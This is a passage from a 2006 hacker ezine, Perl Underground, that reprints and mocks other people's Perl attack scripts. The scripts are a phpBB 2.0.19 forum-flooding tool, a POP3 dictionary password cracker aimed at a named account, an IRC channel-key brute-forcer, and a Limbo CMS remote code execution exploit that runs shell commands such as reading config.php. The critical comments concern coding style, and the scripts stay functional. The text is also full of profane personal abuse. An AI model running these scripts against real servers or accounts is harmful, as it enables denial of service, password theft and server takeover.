	    &#39;.__.&#39;


=&gt; Exploit phpBB 2.0.19 ( by SpiderZ )
=&gt; Topic infinitely exploit
=&gt; Sito: www.spiderz.tk

_________________________________________________________________________
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;|

};

# well isn&#39;t that just fucking pretty
# No good information, just you marking your territory by taking a piss on us
# we&#39;re right offended, aren&#39;t we?

use IO::Socket;
# this looks lonely. If you have time to write that ascii art you
# have time to write a few more use lines, they might help you

$x = 0;

print q(
Exploit phpBB 2.0.19 ( by SpiderZ )

);
print q(
# you know what they say, english is the language of the internet
# perhaps it is better for both of us that I can&#39;t read that
=&gt; Scrivi l&#39;url del sito senza aggiungere http &amp; www
=&gt; Url: );
$host = &lt;STDIN&gt;;
chop ($host);

print q(
=&gt; Adesso indica in quale cartella e posto il phpbb
=&gt; di solito si trova su /phpBB2/ o /forum/
=&gt; Cartella: );
$pth = &lt;STDIN&gt;;
chop ($pth);

print q(
=&gt; Occhio usa un proxy prima di effettuare l&#39;attacco
=&gt; il tuo ip verra spammato sul pannello admin del forum
=&gt; Per avviare l&#39;exploit scrivi &quot; hacking &quot;
=&gt; );
$type = &lt;STDIN&gt;;
chop ($type);

# most would prefer to have command line options as oppose to
# being walked through like that.
# regardless, it is chompd (my $type = &lt;STDIN&gt;);

if($type == 1){


while($x != 0000)
{

# what the fuck is wrong with you
$x++;
}


}
elsif ($type == hacking){


while($x != 10000)
{

$postit = 
&quot;post=Hacking$x+&amp;username=Exploit&amp;subject=Exploit_phpbb_2.0.19&amp;message=Topic infinitely exploit phpBB 2.0.19&quot;;


$lrg = length $postit;


my $sock = new IO::Socket::INET (
				 PeerAddr =&gt; &quot;$host&quot;,
# Aren&#39;t you glad you had a chance to quote for no reason?
				 PeerPort =&gt; &quot;80&quot;,
				 Proto =&gt; &quot;tcp&quot;,
				);
die &quot;\nConnessione non riuscita: $!\n&quot; unless $sock;

## Invia Search exploit phpbb by SpiderZ

# WE GOT IT THE FIRST TIME, I DON&#39;T WANT TO SEE &quot;SpiderZ&quot; AGAIN

print $sock &quot;POST $pth&quot;.&quot;posting.php?mode=newtopic&amp;f=1 HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
\n&quot;;
print $sock &quot;Referer: $host\n&quot;;
print $sock &quot;Accept-Language: en-us\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511
Firefox/1.0.4\n&quot;;
print $sock &quot;Content-Length: $lrg\n\n&quot;;
print $sock &quot;$postit\n&quot;;
close($sock);

# we have modules for that shit


syswrite STDOUT, &quot;.&quot;;


$x++;
# use a fucking for loop, you dipshit
# don&#39;t steal str0ke&#39;s trick
}
}else{


	die &quot;
Error ! riprova...
\n&quot;;
}

# www.spiderz.tk [2006]
# DON&#39;T BE PROUD

omg lyk teh spyderz r teh skary!@!! run 4 ur lyf lol omg!!11!2

dewd u r so eleet koding bomurz 4 php appz. lyk omg i wish i wuz sush a skild hakr lyk u!
i want u 2 hav my baybees lol!!! mad propz 4 teh awsum work dat u do! it must hav ben so
hard 2 figur owt how 2 do dis awsum hakr stuff! maby sum day i can b lyk u and hak stuf
2!!! lol spyderz rawr! wet urself!!!1 zomg!

Seriously, though; props for the cute, little spider. ASCII art is apparently the height
of your technical prowess, you ignorant fuckstick. Your coding skills are sub-par, your
site is trash, this has nothing to do with security, and your ego, like that of 99.9997%
of all exploit authors, is a few zettabytes too big for my poor, bleeding eyeballs to
handle. But really, this isn&#39;t an exploit. It&#39;s not even clever. It&#39;s a half-assed Perl
script that floods a half-assed PHP script, subsequently messing up a half-assed forum.
It&#39;s so half-assed, in fact, that the half-assed administrator(s) of the half-assed
forums which you undoubtedly plan on stroking your inconceivably small e-peen over while
running your half-assed script could clean up your half-assed &quot;attack&quot; with a single,
half-assed SQL command followed by a subsequent ban of your half-assed IP range,
YOU HALF-ASSED, MENTALLY DERANGED, POSEUR, SCRIPT KIDDY, COCK SUCKER!

Ahem.

lol. spyderz. rawr... bitch

-[0x1A] # Hello h0no -----------------------------------------------------

Just the other day I was reading h0no 3. It&#39;s quite the publication. Hours of amusement. Like a
good novel, I could go read it again and get much more out of it. Sure, it might have been a bit
reminiscent of past h0no writes. Sure, the leet speak might be annoying for 95% (or a similar
made-up percentage!) of the people that read it. Sure, h0no can be as self-glorifying as ever.
Sure, it is full of old news. But despite the faults, that&#39;s one damn fine publication. Action
packed. Cheers to the torch carriers!

There&#39;s one small issue, though. You mention a lot of source. You list a ton of source. But very
little is printed. Show us the damn .pl. Show us your .pl, show us everyone&#39;s .pl. That could be
Perl Underground 4 right there. Can you take the heat, do you have any good perl source code to
show for yourselves? Not the shitty stuff, we&#39;ve covered that before. Can you impress us? I don&#39;t
care. Release it all. Publicly or privately. Give us the .pl! Free the .pl!

Instead we&#39;ll shame the horrible source you made fun of people by displaying.

#!/usr/bin/perl -w

# warnings &gt; -w
# use strict

use Net::POP3;

# setup
my $host = &quot;poczta.onet.pl&quot;;
my $user = &quot;malgosia181&quot;;
my $dict = &quot;polish&quot;;

print &quot;mrack.pl by konewka\n&quot;;

# lame
open(WORDLIST, $dict);
$pass = &lt;WORDLIST&gt;;
# how about you loop that, while (my $pass = &lt;WORDLIST&gt;) {
$| = 1;

while ($pass ne &quot;&quot;) {
    $pop3 = Net::POP3-&gt;new($host); die &quot;Can&#39;t connect !&quot; unless $pop3;
    $pass = substr($pass, 0, length($pass)-1);
    $cracked = $pop3-&gt;login($user, $pass);
    if (defined($cracked)) {
print &quot;\nCracked ! Password = &quot;.$pass.&quot;\n&quot;;
$pop3-&gt;quit();
close(WORDLIST);
exit 1337;
# no, it really isn&#39;t
    }
    else {
print &quot;.&quot;;
    }
    $pass = &lt;WORDLIST&gt;;
}

printf &quot;I guess nothing was cracked this time.\n&quot;;
# why printf now? Can&#39;t be consistent? Confused?


#!/usr/bin/perl
print &quot;Hello, World!\n&quot;;

print &quot;ls&quot;;

^
 --- 0H FUq B4TM4N H3 W1LL T4KE 0V3R TH3 W0RLD W1TH C0D3 LIK3 D1S

# I think that about covers it.


#!/usr/bin/perl -w

# Net::IRC is for noobs. Get with the PoCo aMiGo
use Net::IRC;
use Net::IRC::Event;

#open(WL, &quot;/home/uberuser/wordlist&quot;) or die &quot;Failed to open
#wordlist$!\n&quot;;
#	 @keys = &lt;WL&gt;;
#	 chomp(@keys);
#	 close(WL);

# I&#39;m glad that is commented out, and you should be too

$irc = new Net::IRC;
$conn = $irc-&gt;newconn(Nick    =&gt; &#39;LEECHAXSS&#39;,
			  Server  =&gt; &#39;irc.servercentral.net&#39;,
			  Port	  =&gt;  6667,
			  Username =&gt; &quot;iheartu&quot;,
			  Ircname =&gt; &#39;I LOVE CRAXING DOT IN&#39;);
$chan = &quot;#pokemon&quot;;
# isn&#39;t this all so cute!

# difficulties being consistent with your quoting?

sub on_connect {
	($self) = shift;
$self-&gt;join(&quot;#seele&quot;);
$stime = `date +\&quot;%b/%d/%Y %H:%M:%S\&quot;`;
# We have Perl shit for that!

	foreach $chankey (`cat wordlist`) {
# you disgust me
		print &quot;TRYING: $chankey\n&quot;;
		$self-&gt;join(&quot;$chan&quot;, &quot;$chankey&quot;);
# just wouldn&#39;t be complete without quoting variable names.
		sleep(2);
# and unnecessary parens
	}
}

sub on_names {
			$endtime = `date +\&quot;%b/%d/%Y %H:%M:%S\&quot;`;
			$self-&gt;privmsg(&quot;#seele&quot;, &quot;uberuser: $chan key: $chankey&quot;);
			$self-&gt;privmsg(&quot;uberuser&quot;, &quot;$chan key: $chankey&quot;);
			$self-&gt;quit(&quot;I LOL&#39;d&quot;);
			print &quot;START TIME: $stime\nEND TIME: $endtime\n&quot;;
			print &quot;$chan KEY: $chankey\n&quot;;
}

#$conn-&gt;add_handler(&#39;msg&#39;, \&amp;on_msg);
#$conn-&gt;add_handler(&#39;mode&#39;, \&amp;on_mode);
$conn-&gt;add_global_handler(&#39;376&#39;, \&amp;on_connect);
$conn-&gt;add_global_handler(353, \&amp;on_names);
$irc-&gt;start;
# between the Net::IRC crap you manage to fit...crap! Congrats

Want more of that h0no? Your vanquished foes ridiculed yet again? FREE THE SRC.

-[0x1B] # Killer str0ke --------------------------------------------------

Glad to meet you again! Last but not least. The amount of ribbing you get certainly
isn&#39;t fair. What shall you do?

#!/usr/bin/perl
##
## Limbo CMS &lt;= 1.0.4.2 (ItemID) Remote Code Execution Exploit
## Bug Discovered by: Coloss / Epsilon (advance1[at]gmail.com) http://coded.altervista.org/limbophp.pl
## /str0ke (milw0rm.com)

use LWP::Simple;

# Why were you too lazy to create new shitty code, instead of reusing this later?

$serv     =  $ARGV[0];
$path     =  $ARGV[1];
$command  =  $ARGV[2];
# my ($serv, $path, $command) = @ARGV;

$cmd      =  &quot;echo start_er;&quot;.
             &quot;$command;&quot;.
             &quot;echo end_er&quot;;
# &quot;echo start_er;$command;echo end_er&quot;
# &quot;echo start_er;&quot; . $command . &quot;;echo end_er&quot;;
# however you choose to do it

my $byte = join(&#39;.&#39;, map { $_ = &#39;chr(&#39;.$_.&#39;)&#39; } unpack(&#39;C*&#39;, $cmd));
# wow, map AND unpack in a one-liner! you got mad skills!

sub usage
{
        print &quot;Limbo CMS &lt;= 1.0.4.2 (ItemID) Remote Code Execution Exploit /str0ke (milw0rm.com)&quot;;
        print &quot;Usage: $0 www.example.com /directory/ \&quot;cat config.php\&quot;\n&quot;;
        print &quot;sever    -  URL\n&quot;;
        print &quot;path     -  path to limbo\n&quot;;
        print &quot;command  -  command to execute\n&quot;;
        exit ();
# really, why the parens? some psycho paren addiction you have
}

sub exploit
{
        print qq(Limbo CMS &lt;= 1.0.4.2 (ItemID) Remote Code Execution Exploit\n/str0ke (milw0rm.com)\n\n);
        $URL = sprintf(&quot;http://%s%sindex.php?option=frontpage&amp;Itemid=passthru($byte)&quot;,$serv,$path);
# sprintf now, are we? direct interpolation just isn&#39;t good enough anymore
        my $content = get &quot;$URL&quot;;
# abandoning your paren policy AND using unnecessary quoting
        if ($content =~ m/start_er(.*?)end_er/ms) {
                my $out = $1;
                $out =~ s/^\s+|\s+$//gs;
# depending on the circumstances you might want //m as well
                if ($out) {
                        print &quot;$out\n&quot;;
                }
# print &quot;$out\n&quot; if $out;
        }
}

if (@ARGV != 3){&amp;usage;}else{&amp;exploit;}
# again with the ugliness
# you don&#39;t even tab or line break consistently
# just like to wrap it up with this shit ending?

# Because we didn&#39;t see milw0rm the first two times...
# milw0rm.com [2006-03-01]

Thus did the Lords speaketh of his abominable works, &quot;Your Lords, your Gods, contemplate this work and 
find themselves, even through their boundless wisdom, intellect, and fortitude, able to contrive naught
but reticient bewilderment, credence to the defilement of our image and standards, the architect of said
afflictions irrefutably the personification of intellectual ineptitude and masochistic engrossment; 
inexhaustible beguilement the conclusive rumneration for those imprudent and pertinacious enough to 
perchance jeopardize their psychological equanimity through compliant subjection to the aforementioned 
onslaught of incongruity. Remove this heathen from our presence, for he is a blemish upon the face of 
all Creation.&quot;

Thus was str0ke cast from his home and stoned before the city gates, damned to an eternity of flame and 
retribution for his desecrations.

Thus did Jesus speaketh of their justice, &quot;Fucking OWNED!&quot;

Thus did the Lords speaketh of Jesus&#39; observations, &quot;Word.&quot;

Thus did the Gods of Perl Underground, the Lords of all creation, 
layeth the holy smackdown on str0ke&#39;s candy ass.

-[0x1C] # Shoutz and Outz ------------------------------------------------

A big &quot;Thank you&quot; goes out to everyone who has helped make this possible. Specific thanks go out to
our three wise men, Jeff Pinyan (??), Mark Jason Dominus, and Randal L. Schwartz, for continually
producing irresitable articles. It has been a great ride, these three ezines. Consider this the end
of a trilogy. Perl Underground 4 could be a long time away, it could be a small magazine, it could
be something very different, it could be more of the same, or it could be nothing at all.
Regardless of the ezine status, the members of Perl Underground will hack onward.

s^fight^code^g;
print;

We shall go on to the end, we shall code in France, we shall code on the seas and oceans, we shall
code with growing confidence and growing strength in the air, we shall defend our Island, whatever
the cost may be, we shall code on the beaches, we shall code on the landing grounds, we shall code
in the fields and in the streets, we shall code in the hills; we shall never surrender

Please distribute.
 ___	   _	_ _	  _	    ___ 		  _
| _ |	  | |  | | |	 | |	   |   |		 | |
|  _|_ ___| |  | | |___ _| |___ ___|  _|___ ___ _ _ ___ _| |
| | -_|  _| |  | | |   | . | -_|  _| | |  _| . | | |   | . |
|_|___|_| |_|  |___|_|_|___|___|_| |___|_| |___|___|_|_|___|

Forever Abigail

$_ = &quot;\x3C\x3C\x45\x4F\x46\n&quot; and s/&lt;&lt;EOF/&lt;&lt;EOF/ee and print;
&quot;Just another Perl Hacker,&quot;
EOF</pre><div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
